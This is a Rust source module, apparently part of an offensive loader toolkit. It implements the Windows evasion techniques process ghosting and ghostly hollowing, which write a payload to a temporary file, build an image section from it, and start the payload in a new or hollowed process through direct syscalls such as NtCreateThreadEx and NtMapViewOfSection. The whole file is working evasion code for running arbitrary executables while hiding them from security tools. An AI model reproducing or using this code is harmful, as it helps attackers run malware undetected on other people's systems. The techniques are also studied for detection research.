pub mod ghost_process;
pub mod ghost_section;
pub mod temp_file;

use alloc::vec::Vec;
use core::ptr::null_mut;
use ghost_process::{create_ghost_process, initialize_process_parms};
use ghost_section::create_ghost_section;
use ntapi::ntmmapi::ViewUnmap;
use temp_file::{create_temp_file, open_and_prepare_temp_file, write_payload};
use windows_sys::Win32::System::{Memory::PAGE_READONLY, Threading::THREAD_ALL_ACCESS};

use crate::{
    log, syscall,
    techniques::process_utils::{create_process, get_cmdline, terminate},
};

unsafe fn get_section(payload: &[u8]) -> usize {
    unsafe {
        let nt_path = create_temp_file(true);
        let file_handle = match open_and_prepare_temp_file(&nt_path) {
            Some(h) => h,
            None => return 0,
        };
        if !write_payload(file_handle, payload) {
            return 0;
        }
        let section_handle = match create_ghost_section(file_handle, true) {
            Some(h) => h,
            None => return 0,
        };
        section_handle
    }
}

pub fn process_ghosting(payload: &[u8]) {
    unsafe {
        let section_handle = get_section(payload);
        let process_handle = match create_ghost_process(section_handle) {
            Some(h) => h,
            None => return,
        };

        let target_cmdline = get_cmdline();
        let binding = target_cmdline.encode_utf16().collect::<Vec<_>>();
        let target_cmdline_wide = binding.as_slice();

        let mut image_base: *mut core::ffi::c_void = null_mut();
        let success = initialize_process_parms(
            process_handle,
            target_cmdline_wide.as_ptr(),
            &mut image_base,
        );
        if !success {
            log!("InitializeProcessParms failed.");
            syscall!("NtClose", process_handle);
            return;
        }

        let (_, nt) = super::super::pe_utils::parse_headers(payload);
        let entry_point = image_base.byte_add(nt.OptionalHeader.AddressOfEntryPoint as usize);

        let mut thread: usize = 0;
        let status = syscall!(
            "NtCreateThreadEx",
            &mut thread as *mut usize as usize,
            THREAD_ALL_ACCESS,
            null_mut::<u8>(), // ObjectAttributes
            process_handle,   // Target process
            entry_point,      // Start address
            null_mut::<u8>(), // Parameter to pass to entry point
            0,                // CreateFlags (0 = run immediately)
            0,                // ZeroBits
            0,                // StackSize
            0,                // MaximumStackSize
            null_mut::<u8>()  // AttributeList
        );

        println!("NtCreateThreadEx status: 0x{:X}", status);
    }
}

pub fn ghostly_hollowing(payload: &[u8]) {
    unsafe {
        let section_handle = get_section(payload);
        let (_, nt) = super::super::pe_utils::parse_headers(payload);

        let pi = create_process(true, false, true).unwrap();

        let mut base_address: usize = 0;
        let mut view_size: usize = 0;
        let status = syscall!(
            "NtMapViewOfSection",
            section_handle,
            pi.hProcess,
            &mut base_address,
            0,
            0,
            null_mut::<u8>(),
            &mut view_size,
            ViewUnmap,
            0,
            PAGE_READONLY
        );
        if status < 0 {
            log!("NtMapViewOfSection failed: 0x{:X}", status);
            terminate(pi.hProcess);
            return;
        }

        if !crate::techniques::pe::process_hollowing::hollow_process(
            pi,
            base_address,
            nt.OptionalHeader.AddressOfEntryPoint,
        ) {
            log!("Hollowing process failed.");
            return;
        }
    }
}
